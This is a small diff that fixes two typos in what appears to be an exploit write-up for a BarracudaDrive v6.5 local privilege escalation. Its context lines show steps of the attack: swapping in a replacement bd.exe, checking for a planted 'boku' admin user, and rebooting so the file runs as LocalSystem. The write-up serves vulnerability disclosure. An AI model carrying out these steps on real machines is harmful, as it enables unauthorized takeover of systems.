@@ -12,7 +12,7 @@
 # Vulnerability Description:
 #   Insecure Service File Permissions in bd service in Real Time Logics BarracudaDrive v6.5 
 #   allows local attackers to escalate privileges to admin via replacing the bd.exe file and 
-#   restarting the computer where the malicous code  will be executed as 'LocalSystem' on 
+#   restarting the computer where the malicious code  will be executed as 'LocalSystem' on 
 #   the next startup automatically.
 
 ## Insecure Folder Permission
@@ -81,7 +81,7 @@ C:\bd>move C:\Users\lowpriv\Downloads\bd.exe .
 
 #6. Check that exploit admin user doesn't exit
 C:\bd>net user boku
-The user name could not be fouund
+The user name could not be found
 
 #6. Reboot the Computer
 C:\bd>shutdown /r
